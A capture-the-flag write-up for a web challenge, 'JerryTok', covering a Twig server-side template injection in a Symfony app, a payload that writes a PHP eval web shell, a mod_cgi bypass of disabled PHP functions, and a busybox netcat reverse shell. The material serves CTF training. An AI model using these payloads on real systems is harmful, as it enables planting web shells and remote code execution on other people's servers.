---
layout:
  width: default
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
  tags:
    visible: true
  actions:
    visible: true
tags:
  - web
  - medium
---

# JerryTok

### Reconnaissance & Application Analysis

Starting with `Dockerfile` and `entrypoint.sh`:

{% code title="Dockerfile" %}
```dockerfile
FROM alpine:3

# Setup user
RUN adduser -D -u 1000 -g 1000 -s /bin/sh www

# Install system packages
RUN apk add --no-cache --update supervisor openssl curl apache2 \
    build-base pkgconfig libxml2-dev openssl-dev libzip-dev

# Install php dependencies
RUN apk add --no-cache --update coreutils gettext php-cgi php-fpm php-ctype php-curl php-dom php-gd \
    php-iconv php-json php-intl php-fileinfo php-mbstring php-opcache php-openssl php-pdo \
    php-pdo_mysql php-mysqli php-xml php-xsl php-zlib php-phar php-tokenizer php-session \
    php-simplexml php-zip php-xmlwriter php-sodium php-pecl-apcu make 

...

# Add readflag binary
COPY readflag.c /
RUN gcc -o /readflag /readflag.c && chmod 4755 /readflag && rm /readflag.c

# Copy flag
COPY flag /root/flag

# Install dependencies
RUN php /usr/local/bin/composer install
RUN chown -R www:www /www/var /www/vendor

...

ENTRYPOINT ["/entrypoint.sh"]
```
{% endcode %}

{% code title="entrypoint.sh" %}
```shellscript
#!/bin/ash

# Secure entrypoint
chmod 600 /entrypoint.sh

# Secure PHP Installation
mkdir -p /etc/php84/conf.d
mkdir -p /run/apache2

echo "disable_functions = exec, system, popen, proc_open, shell_exec, passthru, ini_set, putenv, pfsockopen, fsockopen, socket_create, mail" >> /etc/php84/conf.d/disablefns.ini
echo "open_basedir = /www" >> /etc/php84/conf.d/openbdir.ini

# Run supervisord
/usr/bin/supervisord -c /etc/supervisord.conf
```
{% endcode %}

We can conclude the following:

* Backend is running under `PHP CGI` & `Apache`
* Composer is installing `Symfony` and `Twig` from `composer.json`
* Flag can be only read by triggering the SUID binary `/readflag`
* Web user is `www` from `httpd.conf`
* Apparently all functions to run system commands are disabled, also `ini_set` is disabled which means we cannot enable error reporting.

***

### Exploitation

Now by going to the application logic, we can see that there is a direct SSTI in the `DefaultController.php` :

```php
    public function index(Request $request): Response
    {
        $location = $request->get('location');

        if (empty($location))
        {
            $latitude = mt_rand(-90, 90) + mt_rand() / mt_getrandmax();
            $longitude = mt_rand(-180, 180) + mt_rand() / mt_getrandmax();
            $location = "($latitude, $longitude)";
        } 
        
        $message = $this->container->get('twig')->createTemplate(
                "Located at: {$location} from your ship's computer"
            )
            ->render();
 
        return $this->render('base.html.twig', [
            'message' => $message ?? ''
        ]);
    }
```

There are many payloads with different techniques which you can utilize to exploit it, I will be using this [one](https://github.com/davwwwx/CVE-2022-23614):

{% code title="" %}
```
{{ ['/www/public/hacked.php','<?php echo eval($_GET["cmd"]); ?>']|sort('file_put_contents') }}
```
{% endcode %}

We get 200 OK. Now let's check if it's working properly:

`/hacked.php?cmd=return+file_get_contents("index.php");`

<figure><img src="../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

Seems fine.

***

### Privilege Escalation

Now as we have code execution with PHP, we want a way to escalate this further to RCE, after searching on how to bypass `disable_functions` I landed on [this](https://github.com/Medicean/as_bypass_php_disable_functions), you can also check [this](https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/index.html).

<figure><img src="../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

This was translated from Chinese, the repository is basically a plugin to some penetration testing framework which I'm not really interested in. I started by searching about each mode and I have reached the following conclusions:

`LD_PRELOAD` won't work because `setenv` function is disabled.

`Fastcgi/PHP_FPM` won't work because `php-fpm` is not running

`Apache Mod CGI` works!

#### Exploit modification

I found this [exploit](https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-mod_cgi.html) in Hacktricks, but we need to edit a bunch of things:

<figure><img src="../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

* The exploit uses `apache_get_modules` which is only available when the PHP is installed as an apache module and not as a CGI. I've discovered this via a comment in [PHP docs](https://www.php.net/manual/en/function.apache-get-modules.php).
* for the `$htaccess = !empty($_SERVER['HTACCESS']);` I don't know how the author came with this key because there is no such thing.

Anyways put these two (`$modcgi` & `$htaccess`) to `1` so it evaluates to `true` in the later `if` check.

You also need to change the syntax of the netcat command, as Alpine linux uses busybox version:

{% code title="netcat" %}
```
nc ip port -e /bin/sh
```
{% endcode %}

Finally, change the shebang to `#!/bin/sh` because alpine doesn't have bash.

#### Final touches

Upload the file to `pastebin` and download it via the file\_\*\_contents functions:

<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

Include the downloaded file, with checked = any value

<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

As I'm in Burp, the payload will not get executed because HTML is not rendered, just click the `Render` tab and we are done:

<figure><img src="../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

